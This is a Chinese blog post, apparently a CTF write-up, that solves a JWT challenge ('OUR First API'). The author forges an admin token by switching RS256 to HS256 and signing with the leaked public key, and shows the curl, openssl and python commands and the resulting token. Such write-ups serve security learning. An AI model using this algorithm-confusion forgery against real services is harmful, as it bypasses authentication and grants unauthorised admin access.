@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言这几天做了ASIS 2019 Final的web题感觉有些东西自己并不是很清楚，因此在赛后总结一波。 0x01 OUR First API你可以访问如下的这些路由123ctfchallenges.ritsec.club:3000/authctfchallenges.ritsec.club:4000/api/normalctfchallenges.ritsec.club:4000/api/adm">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ASIS 2019 Final的部分web题解">
+<meta property="og:url" content="http://yoursite.com/2019/11/21/ASIS-2019-Final的部分web题解/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言这几天做了ASIS 2019 Final的web题感觉有些东西自己并不是很清楚，因此在赛后总结一波。 0x01 OUR First API你可以访问如下的这些路由123ctfchallenges.ritsec.club:3000/authctfchallenges.ritsec.club:4000/api/normalctfchallenges.ritsec.club:4000/api/adm">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-11-21T11:40:09.712Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ASIS 2019 Final的部分web题解">
+<meta name="twitter:description" content="前言这几天做了ASIS 2019 Final的web题感觉有些东西自己并不是很清楚，因此在赛后总结一波。 0x01 OUR First API你可以访问如下的这些路由123ctfchallenges.ritsec.club:3000/authctfchallenges.ritsec.club:4000/api/normalctfchallenges.ritsec.club:4000/api/adm">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/21/ASIS-2019-Final的部分web题解/">
+
+
+
+
+
+  <title>ASIS 2019 Final的部分web题解 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/21/ASIS-2019-Final的部分web题解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ASIS 2019 Final的部分web题解</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-21T19:39:02+08:00">
+                2019-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  782
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这几天做了ASIS 2019 Final的web题感觉有些东西自己并不是很清楚，因此在赛后总结一波。</p>
+<h5 id="0x01-OUR-First-API"><a href="#0x01-OUR-First-API" class="headerlink" title="0x01 OUR First API"></a>0x01 OUR First API</h5><h6 id="你可以访问如下的这些路由"><a href="#你可以访问如下的这些路由" class="headerlink" title="你可以访问如下的这些路由"></a>你可以访问如下的这些路由</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctfchallenges.ritsec.club:3000/auth</span><br><span class="line">ctfchallenges.ritsec.club:4000/api/normal</span><br><span class="line">ctfchallenges.ritsec.club:4000/api/admin</span><br></pre></td></tr></table></figure>
+
+<h6 id="当我们尝试去访问这些API时，它会返回缺少JWT授权。"><a href="#当我们尝试去访问这些API时，它会返回缺少JWT授权。" class="headerlink" title="当我们尝试去访问这些API时，它会返回缺少JWT授权。"></a>当我们尝试去访问这些API时，它会返回缺少<code>JWT</code>授权。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl ctfchallenges.ritsec.club:4000/api/normal</span><br><span class="line">Forbidden, missing JWT authorization</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们可以通过访问-auth-name-admin来获取JTW的token。"><a href="#我们可以通过访问-auth-name-admin来获取JTW的token。" class="headerlink" title="我们可以通过访问/auth?name=admin来获取JTW的token。"></a>我们可以通过访问<code>/auth?name=admin</code>来获取<code>JTW</code>的token。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl ctfchallenges.ritsec.club:3000/auth?name=admin</span><br><span class="line">&#123;&quot;token&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoidXNlciIsImlhdCI6MTU3NDExNDU3N30.tAg_5g-W5Ch5iauAtWA-ZyfMunJX2YDbNpKgxvvPp0ciMF8YDt7EoUJhs9A-WxzC2z0xs72Kv_5C4HBoCG3Wz-y5on6wDNBZotwCd-vjRXRWURSfoTftnvtvfvF408IUEDVJ_T5ftcT03WDBOWiz2_AhLMJ5mENd4g1aPc__Z7M&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们可以使用该JWT作为-api-normal端点，但是你必须是admin。"><a href="#我们可以使用该JWT作为-api-normal端点，但是你必须是admin。" class="headerlink" title="我们可以使用该JWT作为/api/normal端点，但是你必须是admin。"></a>我们可以使用该JWT作为<code>/api/normal</code>端点，但是你必须是admin。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://ctfchallenges.ritsec.club:4000/api/normal -H &apos;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoidXNlciIsImlhdCI6MTU3NDExNDU3N30.tAg_5g-W5Ch5iauAtWA-ZyfMunJX2YDbNpKgxvvPp0ciMF8YDt7EoUJhs9A-WxzC2z0xs72Kv_5C4HBoCG3Wz-y5on6wDNBZotwCd-vjRXRWURSfoTftnvtvfvF408IUEDVJ_T5ftcT03WDBOWiz2_AhLMJ5mENd4g1aPc__Z7M&apos;</span><br><span class="line">&#123;&quot;flag&quot;:&quot;Congrats on authenticating! Too bad flags aren&apos;t for normal users !!&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="使用该token作为-api-admin端点，返回Not-an-admin-，因此我们查看该token的内容。"><a href="#使用该token作为-api-admin端点，返回Not-an-admin-，因此我们查看该token的内容。" class="headerlink" title="使用该token作为/api/admin端点，返回Not an admin!，因此我们查看该token的内容。"></a>使用该token作为<code>/api/admin</code>端点，返回<code>Not an admin!</code>，因此我们查看该token的内容。</h6><h6 id="我们可以到https-jwt-io-去解密token，token的内容如下："><a href="#我们可以到https-jwt-io-去解密token，token的内容如下：" class="headerlink" title="我们可以到https://jwt.io/去解密token，token的内容如下："></a>我们可以到<code>https://jwt.io/</code>去解密token，token的内容如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;admin&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;iat&quot;: 1574114577</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="显然，我们必须伪造自己的token，并将type中的user设置为admin，但是我们必须使用私钥对其进行签名，否则签名检查将会失败。"><a href="#显然，我们必须伪造自己的token，并将type中的user设置为admin，但是我们必须使用私钥对其进行签名，否则签名检查将会失败。" class="headerlink" title="显然，我们必须伪造自己的token，并将type中的user设置为admin，但是我们必须使用私钥对其进行签名，否则签名检查将会失败。"></a>显然，我们必须伪造自己的token，并将<code>type</code>中的<code>user</code>设置为<code>admin</code>，但是我们必须使用私钥对其进行签名，否则签名检查将会失败。</h6><h6 id="刚开始，我尝试去修改这个算法和这个token的类型并且改变-quot-alg-quot-quot-RS256-quot-为-quot-alg-quot-quot-none-quot-，但是没有成功。"><a href="#刚开始，我尝试去修改这个算法和这个token的类型并且改变-quot-alg-quot-quot-RS256-quot-为-quot-alg-quot-quot-none-quot-，但是没有成功。" class="headerlink" title="刚开始，我尝试去修改这个算法和这个token的类型并且改变&quot;alg&quot;:&quot;RS256&quot;为&quot;alg&quot;:&quot;none&quot;，但是没有成功。"></a>刚开始，我尝试去修改这个算法和这个token的类型并且改变<code>&quot;alg&quot;:&quot;RS256&quot;</code>为<code>&quot;alg&quot;:&quot;none&quot;</code>，但是没有成功。</h6><h6 id="最后在查看API文档的源代码时，看到了这个注释-lt-Robots-can-help-you-with-the-api-gt-，我们访问robots-txt时得到了下面的内容。"><a href="#最后在查看API文档的源代码时，看到了这个注释-lt-Robots-can-help-you-with-the-api-gt-，我们访问robots-txt时得到了下面的内容。" class="headerlink" title="最后在查看API文档的源代码时，看到了这个注释&lt;!-- Robots can help you with the api --&gt;，我们访问robots.txt时得到了下面的内容。"></a>最后在查看API文档的源代码时，看到了这个注释<code>&lt;!-- Robots can help you with the api --&gt;</code>，我们访问<code>robots.txt</code>时得到了下面的内容。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://ctfchallenges.ritsec.club:3000/robots.txt</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /signing.pem</span><br><span class="line">Disallow: /auth</span><br></pre></td></tr></table></figure>
+
+<h6 id="因此，我们得到了signing-pem将用于验证JWT签名的公钥。这一定是一个提示，因此我们开始Google并且找到了这个：https-www-nccgroup-trust-uk-about-us-newsroom-and-events-blogs-2019-january-jwt-attack-walk-through"><a href="#因此，我们得到了signing-pem将用于验证JWT签名的公钥。这一定是一个提示，因此我们开始Google并且找到了这个：https-www-nccgroup-trust-uk-about-us-newsroom-and-events-blogs-2019-january-jwt-attack-walk-through" class="headerlink" title="因此，我们得到了signing.pem将用于验证JWT签名的公钥。这一定是一个提示，因此我们开始Google并且找到了这个：https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/"></a>因此，我们得到了<code>signing.pem</code>将用于验证JWT签名的公钥。这一定是一个提示，因此我们开始Google并且找到了这个：<a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/" target="_blank" rel="noopener">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/</a></h6><h6 id="我们修改头部并将算法-quot-alg-quot-quot-RS256-quot-RSA-更改为-quot-alg-quot-quot-HS256-quot-HMAC-，该算法使用共享密钥进行签名验证，然后，我们修改payload，并设置-quot-type-quot-quot-admin-quot-和创建我们的HMAC签名，并将public-key用作secret。当我们发送这个token到这个API时，他有望接收更改后的算法类型，并将签名作为HMAC类型进行处理，而public-key现在用作secret-key。"><a href="#我们修改头部并将算法-quot-alg-quot-quot-RS256-quot-RSA-更改为-quot-alg-quot-quot-HS256-quot-HMAC-，该算法使用共享密钥进行签名验证，然后，我们修改payload，并设置-quot-type-quot-quot-admin-quot-和创建我们的HMAC签名，并将public-key用作secret。当我们发送这个token到这个API时，他有望接收更改后的算法类型，并将签名作为HMAC类型进行处理，而public-key现在用作secret-key。" class="headerlink" title="我们修改头部并将算法&quot;alg&quot;:&quot;RS256&quot;(RSA)更改为&quot;alg&quot;:&quot;HS256&quot;(HMAC)，该算法使用共享密钥进行签名验证，然后，我们修改payload，并设置&quot;type&quot;:&quot;admin&quot;和创建我们的HMAC签名，并将public key用作secret。当我们发送这个token到这个API时，他有望接收更改后的算法类型，并将签名作为HMAC类型进行处理，而public key现在用作secret key。"></a>我们修改头部并将算法<code>&quot;alg&quot;:&quot;RS256&quot;</code>(RSA)更改为<code>&quot;alg&quot;:&quot;HS256&quot;</code>(HMAC)，该算法使用共享密钥进行签名验证，然后，我们修改payload，并设置<code>&quot;type&quot;:&quot;admin&quot;</code>和创建我们的HMAC签名，并将public key用作secret。当我们发送这个token到这个API时，他有望接收更改后的算法类型，并将签名作为HMAC类型进行处理，而public key现在用作secret key。</h6><h6 id="修改头部和payload并使用base64编码后的jWT如下："><a href="#修改头部和payload并使用base64编码后的jWT如下：" class="headerlink" title="修改头部和payload并使用base64编码后的jWT如下："></a>修改头部和payload并使用base64编码后的jWT如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9</span><br></pre></td></tr></table></figure>
+
+<h6 id="然后，使用public-key作为secret创建HMAC签名，并将其转换为base64。"><a href="#然后，使用public-key作为secret创建HMAC签名，并将其转换为base64。" class="headerlink" title="然后，使用public key作为secret创建HMAC签名，并将其转换为base64。"></a>然后，使用public key作为secret创建HMAC签名，并将其转换为base64。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat signing.pem | xxd -p | tr -d &quot;\\n&quot;</span><br><span class="line">$ echo -n &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9&quot; | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d4947664d413047435371475349623344514542415155414134474e4144434269514b426751444271757a4d476b5a6c4a6d5a6d34705970707865446d7347640a382b396d4f683553394f375737477535564279666c3769334a6443664778524a6448736367366c333231506554587358475a37676f486434586a762f46744b510a44796f614b716c344b6c3639324b4b4b4e2f39784136744b644f5951625a76507179525855564f4764795a31327146424f517a49376f783232594c33756c2f330a6e796944522b702b4a4b62645655364157514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a</span><br><span class="line">$ python2 -c &quot;exec(\&quot;import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex(&apos;1c0a91a9e5e1a74f8f2f57cd443984d2904a826a21bb41a672d246a7005d4e9b&apos;)).replace(&apos;=&apos;,&apos;&apos;)\&quot;)&quot;</span><br></pre></td></tr></table></figure>
+
+<h6 id="具有签名的JTW如下所示："><a href="#具有签名的JTW如下所示：" class="headerlink" title="具有签名的JTW如下所示："></a>具有签名的JTW如下所示：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9.HAqRqeXhp0-PL1fNRDmE0pBKgmohu0GmctJGpwBdTps</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们发送这个token到API"><a href="#我们发送这个token到API" class="headerlink" title="我们发送这个token到API"></a>我们发送这个token到API</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://ctfchallenges.ritsec.club:4000/api/admin -H &apos;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJuYW1lIjoiYWRtaW4iLCJ0eXBlIjoiYWRtaW4iLCJpYXQiOjE1NzM5OTMyNDZ9.HAqRqeXhp0-PL1fNRDmE0pBKgmohu0GmctJGpwBdTps&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="flag-RITSEC-JWT-th1s-0ne-d0wn"><a href="#flag-RITSEC-JWT-th1s-0ne-d0wn" class="headerlink" title="flag: RITSEC{JWT_th1s_0ne_d0wn}"></a>flag: <code>RITSEC{JWT_th1s_0ne_d0wn}</code></h6><h5 id="其余的几篇writeup如下："><a href="#其余的几篇writeup如下：" class="headerlink" title="其余的几篇writeup如下："></a>其余的几篇writeup如下：</h5><h6 id="ASIS-2019-Final-–-Trust-Zone"><a href="#ASIS-2019-Final-–-Trust-Zone" class="headerlink" title="ASIS 2019 Final – Trust Zone"></a><a href="https://blog.rwx.kr/asis-2019-final-trust-zone/" target="_blank" rel="noopener">ASIS 2019 Final – Trust Zone</a></h6><h6 id="ASIS-2019-Final-–-Andex"><a href="#ASIS-2019-Final-–-Andex" class="headerlink" title="ASIS 2019 Final – Andex"></a><a href="https://ctftime.org/writeup/17256" target="_blank" rel="noopener">ASIS 2019 Final – Andex</a></h6><h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h5><h6 id="https-www-nccgroup-trust-uk-about-us-newsroom-and-events-blogs-2019-january-jwt-attack-walk-through"><a href="#https-www-nccgroup-trust-uk-about-us-newsroom-and-events-blogs-2019-january-jwt-attack-walk-through" class="headerlink" title="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/"></a><a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/" target="_blank" rel="noopener">https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/</a></h6><h6 id="https-www-sjoerdlangkemper-nl-2016-09-28-attacking-jwt-authentication"><a href="#https-www-sjoerdlangkemper-nl-2016-09-28-attacking-jwt-authentication" class="headerlink" title="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/"></a><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></h6><h6 id="http-demo-sjoerdlangkemper-nl-jwtdemo-hs256-php"><a href="#http-demo-sjoerdlangkemper-nl-jwtdemo-hs256-php" class="headerlink" title="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php"></a><a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php" target="_blank" rel="noopener">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></h6><h6 id="https-jwt-io"><a href="#https-jwt-io" class="headerlink" title="https://jwt.io"></a><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io</a></h6><h6 id="https-0xf4b1-github-io-ctftime-ctf-ritsec-club-web-our-first-api"><a href="#https-0xf4b1-github-io-ctftime-ctf-ritsec-club-web-our-first-api" class="headerlink" title="https://0xf4b1.github.io/ctftime/ctf.ritsec.club/web/our-first-api/"></a><a href="https://0xf4b1.github.io/ctftime/ctf.ritsec.club/web/our-first-api/" target="_blank" rel="noopener">https://0xf4b1.github.io/ctftime/ctf.ritsec.club/web/our-first-api/</a></h6><h6 id="https-xz-aliyun-com-t-2338"><a href="#https-xz-aliyun-com-t-2338" class="headerlink" title="https://xz.aliyun.com/t/2338"></a><a href="https://xz.aliyun.com/t/2338" target="_blank" rel="noopener">https://xz.aliyun.com/t/2338</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/18/从一场CTF比赛中学到的Fuzz思想/" rel="next" title="从一场CTF比赛中学到的Fuzz思想">
+                <i class="fa fa-chevron-left"></i> 从一场CTF比赛中学到的Fuzz思想
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-OUR-First-API"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 OUR First API</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#你可以访问如下的这些路由"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">你可以访问如下的这些路由</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当我们尝试去访问这些API时，它会返回缺少JWT授权。"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">当我们尝试去访问这些API时，它会返回缺少JWT授权。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以通过访问-auth-name-admin来获取JTW的token。"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">我们可以通过访问/auth?name=admin来获取JTW的token。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以使用该JWT作为-api-normal端点，但是你必须是admin。"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">我们可以使用该JWT作为/api/normal端点，但是你必须是admin。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用该token作为-api-admin端点，返回Not-an-admin-，因此我们查看该token的内容。"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">使用该token作为/api/admin端点，返回Not an admin!，因此我们查看该token的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" 